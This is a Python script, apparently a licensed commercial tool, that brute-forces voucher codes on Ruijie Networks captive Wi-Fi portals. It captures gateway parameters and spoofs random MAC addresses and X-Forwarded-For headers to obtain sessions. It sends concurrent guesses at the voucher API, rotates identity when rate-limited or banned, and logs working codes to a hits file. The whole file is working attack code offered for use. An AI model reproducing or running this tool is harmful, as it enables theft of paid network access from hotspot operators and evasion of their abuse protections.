# =====================================================================
# kavin_v7.py - KAVIN FAST SPEED V7 (Ultimate Fixed & Optimized)
# Part 1 of 2
# =====================================================================

import os
import time
import random
import string
import json
import asyncio
import socket
import threading
import re
import urllib3
import requests
import aiohttp
from urllib.parse import urlparse, parse_qs, quote, unquote
from rich.console import Console
from rich.text import Text
from rich.prompt import Prompt
from rich.live import Live
from rich.panel import Panel
from rich.box import ROUNDED
from rich.table import Table
from rich.align import Align

try:
    import license as _license
    HAS_LICENSE_MODULE = True
except ImportError:
    HAS_LICENSE_MODULE = False
    _license = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HITS_FILE = "hits.txt"
CONCURRENCY_LIMIT = 10
TIMEOUT = 5
RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
RUIJIE_WIFIDOG = f"{RUIJIE_BASE}/api/auth/wifidog"
RUIJIE_VOUCHER = f"{RUIJIE_BASE}/api/auth/voucher/?lang=en_US"

console = Console()
tried_codes = set()
code_lock = threading.Lock()
LICENSE_INFO = {"status": "Unverified"}

def generate_random_mac():
    return "00:16:3e:%02x:%02x:%02x" % (
        random.randint(0, 0x7f), random.randint(0, 0xff), random.randint(0, 0xff)
    )

def generate_random_ip():
    return f"192.168.{random.randint(10, 200)}.{random.randint(2, 254)}"

def clear_screen():
    try: os.system('cls' if os.name == 'nt' else 'clear')
    except Exception: pass

def format_time(s):
    try:
        s = int(s)
        return f"{s//3600:02d}:{(s%3600)//60:02d}:{s%60:02d}"
    except: return "00:00:00"

def check_license():
    if not HAS_LICENSE_MODULE: return False, "license.py မရှိပါ။"
    try:
        r = _license.check_approval()
        if isinstance(r, tuple): return r
        expiry_val = getattr(_license, "get_expiry_date", lambda: "Valid")()
        return bool(r), str(expiry_val) if expiry_val else "Valid"
    except Exception as e: return False, str(e)

def activate_license(k):
    if not HAS_LICENSE_MODULE: return False, "license.py မရှိပါ။"
    try: return _license.activate(k)
    except Exception as e: return False, str(e)

def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
        p = ip.split("."); p[-1] = "1"; return ".".join(p)
    except: return "192.168.110.1"

def detect_and_capture():
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml",
    })
    candidates = [
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://detectportal.firefox.com/success.txt",
        "http://captive.apple.com/hotspot-detect.html",
    ]
    for probe in candidates:
        try:
            r = s.get(probe, allow_redirects=True, timeout=5, verify=False)
            if "ruijienetworks" in r.url or "ruijienet" in r.text.lower():
                console.print(f"[green][+] Captured portal: {r.url[:80]}...[/green]")
                return r.url
        except: continue
    
    for gw in dict.fromkeys([get_gateway_ip(), "192.168.110.1", "10.44.77.254", "192.168.7.1"]):
        try:
            r = s.get(f"http://{gw}", timeout=3, allow_redirects=True)
            if "ruijienetworks" in r.url: return r.url
        except: pass
    return None

def build_gw_params(portal_url):
    if not portal_url:
        return {
            "stage": "portal", "gw_id": "c4b25be7d323", "gw_sn": "H1U320P00210A",
            "gw_address": "192.168.7.1", "gw_port": "2060", "ip": "192.168.110.2",
            "mac": "", "slot_num": "14", "nasip": "192.168.1.193",
            "ssid": "VLAN7", "ustate": "0", "mac_req": "1",
            "url": "https://portal-as.ruijienetworks.com"
        }
    
    parsed = urlparse(portal_url)
    q = parse_qs(parsed.query)
    p = {}
    for k in ("gw_id","gw_sn","gw_address","gw_port","nasip","slot_num","ssid",
              "chap_id","chap_challenge","stage","ustate","mac_req","url"):
        if q.get(k): p[k] = q[k][0]
    
    p.setdefault("gw_port", "2060")
    p.setdefault("stage", "portal")
    p.setdefault("mac_req", "1")
    p.setdefault("ustate", "0")
    p.setdefault("gw_id", "c4b25be7d323")
    p.setdefault("gw_sn", "H1U320P00210A")
    p.setdefault("gw_address", "192.168.7.1")
    p.setdefault("nasip", "192.168.1.193")
    p.setdefault("ssid", "VLAN7")
    p.setdefault("slot_num", "14")
    p.setdefault("url", portal_url)
    return p

async def fetch_real_session(session, gw_params, mac, ip):
    base = RUIJIE_WIFIDOG
    current_url = str(gw_params.get("url", ""))
    if "portal-mm" in current_url:
        base = base.replace("portal-as", "portal-mm-as")

    p = dict(gw_params)
    p["mac"] = mac
    p["ip"] = ip
    qs = "&".join(f"{k}={quote(str(v))}" for k, v in p.items())
    url = f"{base}?{qs}"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36",
        "Client-Mac": mac,
        "X-Forwarded-For": ip,
        "Accept": "*/*",
    }
    try:
        async with session.get(url, headers=headers, timeout=6, allow_redirects=False, ssl=False) as r:
            if r.status == 429: return ("BAN", "429")
            loc = r.headers.get("Location", "")
            if not loc:
                body = await r.text()
                m_loc = re.search(r'href=[\'"]([^\'"]+)[\'"]', body)
                if m_loc: loc = m_loc.group(1)

            if loc:
                loc_lower = loc.lower()
                if any(x in loc_lower for x in ("request limited", "error.html", "errormsg", "banned")):
                    return ("BAN", "banned")
                q = parse_qs(urlparse(unquote(loc)).query)
                sid = q.get("sessionId", [None])[0]
                if sid:
                    return ("REAL", {
                        "sessionId": sid,
                        "sign": q.get("sign", [None])[0],
                        "timestamp": q.get("timestamp", [None])[0],
                        "logonUrl": q.get("logonUrl", [None])[0] or "",
                    })
            return ("NO_SESS", f"HTTP {r.status}")
    except asyncio.TimeoutError: return ("NET", "timeout")
    except Exception as e: return ("NET", type(e).__name__)

async def test_code(session, sess, code, mac, ip):
    url = RUIJIE_VOUCHER
    if sess.get("sign") and sess.get("timestamp"):
        url += f"&sign={sess['sign']}&timestamp={sess['timestamp']}"
    
    headers = {
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Linux; Android 14; Mobile) AppleWebKit/537.36",
        "referer": f"{RUIJIE_BASE}/download/static/maccauth/src/index.html?sessionId={sess['sessionId']}",
        "Client-Mac": mac,
        "X-Forwarded-For": ip,
    }
    payload = {
        "accessCode": code,
        "sessionId": sess["sessionId"],
        "apiVersion": 1,
    }
    if sess.get("sign"): payload["sign"] = sess["sign"]
    if sess.get("timestamp"): payload["timestamp"] = sess["timestamp"]

    try:
        async with session.post(url, json=payload, headers=headers, timeout=TIMEOUT, ssl=False, allow_redirects=True) as r:
            if r.status == 429: return "__RATE_LIMITED__", "N/A"
            text = await r.text()
            if not text: return "__NETWORK_ERROR__", "N/A"

            low = text.lower()
            if "request limited" in low or "too many" in low:
                return "__RATE_LIMITED__", "N/A"
            if "session timed out" in low or "invalid session" in low:
                return "__SESSION_EXPIRED__", "N/A"

            real_plan = "N/A"
            is_hit = False
            try:
                j = json.loads(text)
                if j.get("success") is True or j.get("code") == 200:
                    is_hit = True
                    res_dict = j.get("result", {})
                    if isinstance(res_dict, dict):
                        for k in ["plan", "package", "profile", "duration", "time", "expireTime", "flow"]:
                            if k in res_dict:
                                real_plan = str(res_dict[k])
                                break
                if not is_hit and ('"success":true' in low or '"authresult":"1"' in low or "congratulations" in low):
                    is_hit = True
                
                if real_plan == "N/A":
                    m = re.search(r'"(?:plan|package|profile|duration|time)"\s*:\s*"?([^\",}]+)"?', low)
                    if m: real_plan = m.group(1)
            except:
                if '"success":true' in low or "congratulations" in low:
                    is_hit = True

            return ("HIT" if is_hit else text), real_plan
    except asyncio.TimeoutError: return "__TIMEOUT__", "N/A"
    except aiohttp.ClientError: return "__NETWORK_ERROR__", "N/A"
    except Exception as e: return f"__ERROR__:{type(e).__name__}", "N/A"

seq_counter = 0
seq_lock = threading.Lock()

def gen_code(mode, length, scan_method="random"):
    global seq_counter
    try:
        if scan_method == "sequential":
            with seq_lock:
                seq_counter += 1
                current = seq_counter
            if mode == "num": return str(current).zfill(length)
            elif mode == "eng":
                s, n = "", current
                for _ in range(length): s = chr(ord('a') + (n % 26)) + s; n //= 26
                return s
            elif mode == "mix":
                chars = string.ascii_lowercase + string.digits
                s, n = "", current
                for _ in range(length): s = chars[n % 36] + s; n //= 36
                return s
        else:
            if mode == "num": return str(random.randint(0, 10**length - 1)).zfill(length)
            elif mode == "eng": return ''.join(random.choices(string.ascii_lowercase, k=length))
            elif mode == "mix": return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    except: pass
    return ""
# =====================================================================
# kavin_v7.py - KAVIN FAST SPEED V7 (Ultimate Fixed & Optimized)
# Part 2 of 2
# =====================================================================

def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed, status, hits, speed, cur_mac, cur_ip, sess_stat, sess_id, total_target):
    layout = Table.grid(expand=True)
    layout.add_column()
    
    header_text = Text("⚡ KAVIN FAST SPEED V7 (ULTIMATE) ⚡", style="bold bright_cyan", justify="center")
    panel_header = Panel(header_text, border_style="cyan", box=ROUNDED)

    progress = min(100.0, (tested / total_target) * 100) if total_target > 0 else 0.0

    stats = Table.grid(expand=True, padding=(0, 1))
    stats.add_column(style="bold white", justify="left")
    stats.add_column(style="bold cyan", justify="left")
    stats.add_column(style="bold white", justify="left")
    stats.add_column(style="bold green", justify="left")

    status_style = "bold red" if "ERR" in status.upper() or "BAN" in status.upper() else "bold green"
    sess_style = "bold green" if "REAL" in sess_stat else "bold yellow"

    stats.add_row("  📅 Expiry", f": {LICENSE_INFO['status']}", "  ⏱ Timer", f": {elapsed}")
    stats.add_row("  🎯 Mode",   f": {mode.upper()}",           "  📊 Tested", f": {tested:,}")
    stats.add_row("  ⚡ Speed",  f": {int(speed)} c/m",         "  📡 Status", f": {status.upper()}", style=status_style)
    stats.add_row("  🔑 Hits",   f": {len(hits)}",               "  📌 Engine", f": {scan_method.upper()}")
    stats.add_row("  🖥  MAC",    f": ...{cur_mac[-8:]}",         "  🌐 IP",     f": ...{cur_ip[-3:]}")
    stats.add_row("  🔐 Session", f": {sess_stat}",             "  📈 Progress", f": {progress:.2f}%", style=sess_style)

    stats_panel = Panel(stats, border_style="magenta", box=ROUNDED)
    check_panel = Panel(Align.center(Text(f"Checking Code  :  {current_code if current_code else '------'}", style="bold yellow")), border_style="yellow", box=ROUNDED)

    v_table = Table(show_header=True, header_style="bold bright_white", expand=True, box=ROUNDED, border_style="green")
    v_table.add_column("Voucher Hits", style="bold green", justify="center")
    v_table.add_column("Real Plan / Duration", style="bold green", justify="center")

    for h in hits:
        v_table.add_row(h.get('code', ''), h.get('plan', 'N/A'))
    if not hits: v_table.add_row("No hits found yet...", "N/A")

    footer_text = Text("✨ Developed for KAVIN FAST SPEED • Real Session Active ✨", style="bold bright_yellow")
    footer_panel = Panel(Align.center(footer_text), border_style="red", box=ROUNDED)

    from rich.console import Group
    return Panel(Group(panel_header, stats_panel, check_panel, v_table, footer_panel), border_style="bright_blue")

async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
    global seq_counter, tried_codes
    tried_codes = set()
    seq_counter = 0

    if not gw_params: gw_params = build_gw_params(None)

    mode_str = f"{mode}_{length}"
    hits, tested, start_time = [], 0, time.time()
    current_code = [""]
    current_status = ["Running"]
    sess_stat = ["INITIALIZING"] 
    sess_id = ["--------"] 

    current_mac = [generate_random_mac()]
    current_ip  = [generate_random_ip()]
    sess_data   = [None]

    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
    total_target = 10**length if mode == "num" else (26**length if mode == "eng" else 36**length)

    conn_limit = aiohttp.TCPConnector(limit=50, ssl=False, force_close=True)
    async with aiohttp.ClientSession(connector=conn_limit) as session:
        live = Live(get_dashboard_renderable(mode_str, scan_method, "", tested, "00:00:00", "Running", hits, 0.0, current_mac[0], current_ip[0], sess_stat[0], sess_id[0], total_target), refresh_per_second=4, screen=True)

        with live:
            try:
                while True:
                    if sess_data[0] is None:
                        current_status[0] = "Fetching Session"
                        status_type, res = await fetch_real_session(session, gw_params, current_mac[0], current_ip[0])

                        if status_type == "BAN":
                            current_mac[0] = generate_random_mac()
                            current_ip[0]  = generate_random_ip()
                            sess_stat[0] = "BANNED (Rotating IP)"
                            await asyncio.sleep(2)
                            continue
                        elif status_type != "REAL":
                            sess_stat[0] = f"SESS_ERR ({res})"
                            await asyncio.sleep(3)
                            continue

                        sess_data[0] = res
                        sess_stat[0] = f"REAL ({res['sessionId'][:8]}...)"
                        sess_id[0] = res['sessionId']
                        current_status[0] = "Running"

                    batch_codes = []
                    while len(batch_codes) < CONCURRENCY_LIMIT:
                        c = gen_code(mode, length, scan_method)
                        if c:
                            with code_lock:
                                if c in tried_codes: continue
                                tried_codes.add(c)
                            batch_codes.append(c)
                    if not batch_codes:
                        await asyncio.sleep(0.01); continue

                    async def bounded_check(code):
                        async with semaphore:
                            return await test_code(session, sess_data[0], code, current_mac[0], current_ip[0])

                    tasks = [bounded_check(code) for code in batch_codes]
                    results = await asyncio.gather(*tasks, return_exceptions=True)

                    hit_found = False
                    for idx, res_tuple in enumerate(results):
                        tested += 1
                        code = batch_codes[idx]
                        current_code[0] = code

                        if isinstance(res_tuple, Exception): continue
                        res, plan = res_tuple

                        if res == "__SESSION_EXPIRED__":
                            sess_data[0] = None
                            sess_stat[0] = "EXPIRED"
                            break
                        if res == "__RATE_LIMITED__":
                            sess_data[0] = None
                            current_mac[0] = generate_random_mac()
                            current_ip[0]  = generate_random_ip()
                            sess_stat[0] = "BANNED"
                            hit_found = True
                            break

                        if res == "HIT":
                            now_str = time.strftime("%H:%M:%S")
                            hits.append({"code": code, "time": now_str, "plan": plan})
                            try:
                                with open(HITS_FILE, "a", encoding="utf-8") as f:
                                    f.write(f"[{now_str}] CODE: {code} | PLAN: {plan}\n")
                            except: pass
                            sess_data[0] = None
                            current_mac[0] = generate_random_mac()
                            current_ip[0]  = generate_random_ip()
                            sess_stat[0] = "HIT (Saved)"
                            hit_found = True
                            break

                    elapsed = time.time() - start_time
                    speed = (tested / elapsed * 60) if elapsed > 0 else 0.0

                    live.update(get_dashboard_renderable(mode_str, scan_method, current_code[0], tested, format_time(elapsed), current_status[0], hits, speed, current_mac[0], current_ip[0], sess_stat[0], sess_id[0], total_target))
                    if hit_found: await asyncio.sleep(1)

            except (KeyboardInterrupt, asyncio.CancelledError):
                live.stop()
                console.print("\n[bold yellow]⏹ Interrupted by user[/bold yellow]")
            except Exception as e:
                live.stop()
                console.print(f"\n[bold red]Fatal Error: {e}[/bold red]")

def show_banner():
    clear_screen()
    console.print()
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print(Text("⚡ KAVIN FAST SPEED V7 (ULTIMATE) ⚡", style="bold bright_white"), justify="center")
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print()

def ask_mode():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🔢  Number Mode")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 🔤  Alphabet Mode")
        console.print("  [bold bright_cyan]3.[/bold bright_cyan] 🔀  Mixed Mode")
        console.print("  [bold bright_red]0.[/bold bright_red] ❌  Exit\n")
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if choice == "0": return None
        if choice not in ("1", "2", "3"): continue
        return {"1": "num", "2": "eng", "3": "mix"}[choice]

def ask_length(mode):
    while True:
        show_banner()
        console.print("  [bold bright_white]Choose Voucher Length:[/bold bright_white]\n")
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] ⚡ 6 Characters")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] ⚡ 7 Characters")
        console.print("  [bold bright_cyan]3.[/bold bright_cyan] ⚡ 8 Characters")
        console.print("  [bold bright_cyan]4.[/bold bright_cyan] ⚡ 9 Characters")
        console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if choice == "0": return None
        if choice not in ("1", "2", "3", "4"): continue
        return {"1": 6, "2": 7, "3": 8, "4": 9}[choice]

def ask_scan_method():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🎲  Random Mode")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 📈  Sequential Mode")
        console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if choice == "0": return None
        if choice not in ("1", "2"): continue
        return {"1": "random", "2": "sequential"}[choice]

def run():
    global LICENSE_INFO
    show_banner()

    is_valid, expiry_msg = check_license()
    while not is_valid:
        clear_screen()
        console.print(Panel(Align.center(Text("⚡ KAVIN FAST SPEED V7 ⚡", style="bold bright_magenta")), border_style="bright_magenta"))
        console.print(Panel(Align.center(Text(f"🔐 License Status: {expiry_msg}\nEnter Key to Continue:", style="bold yellow")), border_style="yellow"))
        key = Prompt.ask("   [bold bright_green]➜ 📝 Paste Key Here[/bold bright_green]").strip()

        if key:
            ok, msg = activate_license(key)
            console.print(Panel(Align.center(Text(msg, style="bold bright_green" if ok else "bold red")), border_style="green" if ok else "red"))
            time.sleep(2)
            is_valid, expiry_msg = check_license()
        else: time.sleep(1)

    LICENSE_INFO["status"] = expiry_msg

    portal_url = detect_and_capture()
    gw_params = build_gw_params(portal_url)

    while True:
        mode = ask_mode()
        if mode is None: return
        length = ask_length(mode)
        if length is None: continue
        scan_method = ask_scan_method()
        if scan_method is None: continue

        try:
            asyncio.run(scan_loop_async(mode, length, scan_method=scan_method, gw_params=gw_params))
        except KeyboardInterrupt: pass
        except Exception as e:
            console.print(f"[bold red]Error: {e}[/bold red]")
            time.sleep(2)
        break

def main():
    try: run()
    except (KeyboardInterrupt, EOFError): console.print("\n\n[bold red]Exiting...[/bold red]\n")
    except Exception as e: console.print(f"[bold red]Fatal Error: {e}[/bold red]")
    finally:
        try: clear_screen()
        except: pass
        try:
            console.print("\n\n")
            console.print(Text("✨ Thank You • Contact @kavin799 for Support 🙏", style="bold bright_green"), justify="center")
            console.print("\n\n")
            time.sleep(1)
        except: pass

if __name__ == "__main__":
    main()
